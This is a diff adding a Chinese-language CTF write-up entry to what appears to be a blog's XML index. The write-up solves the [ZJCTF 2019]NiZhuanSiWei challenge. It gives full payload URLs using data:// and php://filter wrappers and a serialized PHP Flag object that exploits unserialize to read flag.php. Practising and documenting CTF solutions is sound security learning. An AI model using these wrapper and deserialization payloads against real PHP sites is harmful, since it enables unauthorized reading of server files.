@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>BUU每日一题019</title>
+    <link href="/2021/02/02/BUU019/"/>
+    <url>/2021/02/02/BUU019/</url>
+    
+    <content type="html"><![CDATA[<h2 id="十九、"><a href="#十九、" class="headerlink" title="十九、"></a>十九、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[ZJCTF 2019]NiZhuanSiWei<br><img src="https://ftp.bmp.ovh/imgs/2021/02/6451d712fe5dcc0a.png">      </p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>传一个<code>$text</code>要其等于<code>welcome to the zjctf</code>这里用的<code>file_get_contents函数</code><br>可以用<code>data://text/plain;base64,</code>伪协议传入<br>下面file中过滤了flag，看来不能用<code>php://filter</code>伪协议读取<code>flag.php</code>了，但可以读取<code>useless.php</code>看看有什么<br>payload：<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p><pre><code>&lt;?php  class Flag&#123;  //flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;      &#125;  &#125;  ?&gt;  </code></pre><p><code>__tostring</code>方法当对象被当作字符串echo是自动执行<br>所以可以利用上面的password得到flag<br>先序列化        </p><pre><code>&lt;?php  class Flag&#123;  //flag.php      public $file=&#39;flag.php&#39;;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;      &#125;  &#125; $a=new Flag();echo serialize($a); ?&gt;        </code></pre><p>运行结果<code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>        </p><h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><p>payload：<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code><br>源码中得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/02/16051bee3a20c7e8.png">      </p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>wp</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>BUU每日一题018</title>
     <link href="/2021/02/01/BUU018/"/>
     <url>/2021/02/01/BUU018/</url>
